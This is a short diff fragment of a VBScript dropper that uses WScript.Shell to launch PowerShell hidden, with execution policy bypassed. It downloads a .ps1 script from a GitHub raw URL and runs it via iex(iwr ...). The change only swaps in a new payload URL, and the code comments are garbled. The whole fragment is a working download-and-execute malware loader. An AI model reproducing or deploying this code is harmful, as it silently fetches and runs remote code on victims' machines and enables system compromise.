@@ -4,7 +4,7 @@ Set o = CreateObject("WScript.Shell") ' Initialize the WScript.Shell object
 sA = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
  
 ' Define the RL of thript
-sB = "$u='https://github.com/afnanr653/dfg-drgh/raw/refs/heads/main/boda.ps1';"
+sB = "$u='https://github.com/afnanr653/fgh-dghj/raw/refs/heads/main/hhhh.ps1';"
  
 ' Defihe command to eecute the ript content
 sC = "iex(iwr $u -UseBasicParsing).Content"
